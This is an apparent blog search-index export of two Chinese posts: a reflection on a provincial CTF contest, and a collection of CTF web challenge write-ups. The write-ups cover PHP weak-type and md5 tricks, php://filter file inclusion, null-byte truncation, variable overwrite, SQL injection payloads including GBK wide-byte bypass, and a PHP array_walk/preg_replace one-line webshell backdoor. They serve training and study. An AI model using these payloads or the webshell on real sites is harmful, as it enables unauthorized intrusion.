<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[记一次CTF大赛的感受]]></title>
    <url>%2F2018%2F10%2F29%2F%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97%2F</url>
    <content type="text"><![CDATA[经常对过去的成功或不足进行总结，是一件很有逼格的事情。 前言10月27号的山东省网络技术大赛是我大学参加过的第一个比赛，在这个比赛中我和各大高校的大佬们共同在网络攻防CTF夺旗赛这一命题中进行角逐。其实在去之前我的心里是没有多少信心的（事实证明我的担心是有必要的），我只会一些基础的web方向的解题方法，因为在我看来这种比赛应该不会涉及到密码，逆向，溢出和隐写等等这几类题，然而。。。 先分享一下当时比赛的场景及最后排名： 我的成绩在里面不是特别理想，在39名选手中排在第11位，得分仅331，与前三名一千多的得分更是有着不小的差距（小声哔哔：前三是来自警察学院的未来的网警），但究其根本还是自己在网络安全这一领域还有很长的路要走。 下面是在这次比赛中我得到的一些经验和教训，特地分享出来，以作交流。后面我会专门出一篇该比赛所有题的write up(如果官方还没有关闭训练场) 先谈不足 过分自信，轻视对手 解题时心静不下来，导致做题时没有深入，往往错过很多会做的题 没有设立明确的目标，导致会的题因为较其他选手稍晚得到flag，得分较低，不会的题又没有尝试去解 在网络安全领域坐井观天，没有保持一颗学习的心态 再说受益 心中始终坚信：学无止境 积累了大赛经验，后续参加此类比赛不至于手忙脚乱 保持自己的底线，不要因过分的自由进而挑战法律与道德(网警是有实力的) 最后展望在经历了此次比赛后，虽然没有取得满意的成绩，但也更加坚定了对未来继续扩展学习方向的信心。接下来的近一年时间，我将根据时间安排准备下一届的网络安全大赛，同时进行PHP、Python等语言的学习，争取将各个CTF大赛的题看一遍write up或自己试解，希望能在下一届的比赛中获得一个令自己比较满意的成绩。 人生没有退路，只有不停地选择！ –苏乞儿]]></content>
      <categories>
        <category>日常</category>
      </categories>
      <tags>
        <tag>-CTF -旅行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF的常见write up]]></title>
    <url>%2F2018%2F10%2F12%2FCTF%2F</url>
    <content type="text"><![CDATA[本文总结了CTF中我所遇到的题型及其write up，本文长期更新 希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！ 训练场：南京邮电大学CTF题库 直接查看源码出现场景：一般出现在第一题 write up： 直接Ctrl+u查看网页源码寻找flag 修改maxlength出现场景：输入框输入内容有位数限制 write up：F12进入开发者模式修改maxlength后提交 IP伪造各种伪造IP的HTTP头： 序号 伪造方式 1 X-Forwarded-For 2 Client-IP 3 x-remote-IP 4 x-originating-IP 5 x-remote-addr 进制转换源码：123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&apos;1&apos;); $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &apos;54975581388&apos;;&#125;$flag=&apos;*******&apos;;if(noother_says_correct($_GET[&apos;key&apos;])) echo $flag;else echo &apos;access denied&apos;;?&gt; 分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc,因此get方法传值key=0xccccccccc PHP弱类型类型一介绍：PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0 出现场景：PHP代码审计、含md5的题 write up： 修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较 扩展：0e开头MD5值小结 string md5() s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 类型二源码： 1234567if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))die(&apos;Flag: &apos;.$flag);elseprint &apos;Wrong.&apos;;&#125; 分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null） 脑洞题 源码找url 源码看flag jjencode/aaencode（颜文字）介绍： 什么是jjencode? 将js代码转换成只有符号的字符串 什么是aaencode？ 将js代码转换成常用的网络表情 aaencode加密：http://utf-8.jp/public/aaencode.html 解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。 文件包含漏洞典型的文件包含漏洞的格式网址：php?file=xxx.php 原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的 利用方法：构建file=php://filter/read=convert.base64-encode/resource=index.php 注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。 注意：python3中base64的解密为base64.b64decode() mysql 精度问题 intval()这个函数的作用是把参数自动转换成整数（int） $id = intval(1024.5)//结果为$id==1024 robots.txt介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。 %00源码：12345678if (isset ($_GET[&apos;nctf&apos;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;;&#125; 涉及漏洞：查到资料 1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 2.当ntf为数组时它的返回值不是FALSE 利用方法： 1.?nctf=1%00%23biubiubiu 2.?nctf[]=1 变量覆盖源码：123456789&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; 分析：extract()函数的作用：从数组中将变量导入到当前的符号表 可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表 由于extract()函数存在变量覆盖漏洞，所以提交post参数： pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123 即:将两个变量的值修改成相同的，即可得到flag！ 上传绕过源码：123456789文件上传&lt;br&gt;&lt;br&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt; 0x00截断绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00 SQL注入常规注入正常闭合源码：1234567891011121314151617&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user]; 分析：会对传入参数两端去空格，然后sql拼接如下 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; 所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。 MySQL主要有三种注释方式： 注释方式 说明 # 注释到行尾 /*内容*/ 用于行间或多行注释（也可用/**/代替空格） – 也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1– ） 解法：本题可post：user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123 sql语句就变成select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;) 查询语句就能成功返回user列，值为admin的那条记录。 union查询源码：123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; 解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有$query[pw]的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。 例如：select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。 注意别忘记输入pass后，会对其进行MD5加密。所以构造post：user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir查询语句就变为SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;; 转义源码：1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;--&gt; 分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造username=suqir\&amp;password=or%201%23使得查询语句如下 SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39; 即123456SELECT * FROM users WHERE name=&apos;suqir\&apos; AND pass=&apos; 『 [name]的值为 [&apos; AND pass=] ，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真』 #&apos; 『 注释掉多余的单引号 』即select * from users where false or 1 一道综合题:南邮CTF-综合题2及其writeup GBK宽字节编码漏洞(gbk_sql_injection)介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞正常情况下 magic_quote_gpc 为ON,如果输入 http://www.xxxx.com/index.php?user=11′ and 1=2 # SQL语句就会变成 SELECT * FROM user WHERE user=’1\’ and 1=2 #’ 自动加上了\转义，如果构造特殊的宽字节编码呢？ http://www.xxxx.com/index.php?user=11%df%27 and 1=2 # SQL语句就变成 SELECT * FROM user WHERE user=’11運’ and 1=2#’ 这样就注入上了！ 11%df会被解析成11運,而%27被邪恶的解析成&#39;就绕过了gpc转义,就成功构造注入了 Unix/Linux相关bash_historyBash shell在~/.bash_history（~/表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个.bash_history文件。 为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。 删除方法: 第一步：/etc/profile文件中的HISTFILESIZE和HISTSIZE行确定所有用户的.bash_history文件中可以保存的旧命令条数。强烈建议把把/etc/profile文件中的HISTFILESIZE和HISTSIZE行的值设为一个较小的数，比如30。编辑profile文件vi /etc/profile，把下面这行改为：12HISTFILESIZE=30HISTSIZE=30 这表示每个用户的.bash_history文件只可以保存30条旧命令。 第二步：网管还应该在/etc/skel/.bash_logout文件中添加下面这行rm -f $HOME/.bash_history。这样，当用户每次注销时.bash_history文件都会被删除. vi编辑器的备份文件linux下一般使用vi编辑器，并且异常退出会留下备份文件xxx.swp 一句话木马数组回调后门源码：12345&lt;?php$e = $_REQUEST[&apos;www&apos;];$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);array_walk($arr, $e, &apos;&apos;);?&gt; 分析：利用了php中回调函数的后门，可以使www为preg_replace函数，当array_walk()将函数作用于数组时，POST传入的数据作为preg_replace()的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。 测试： 未完待续。。。]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
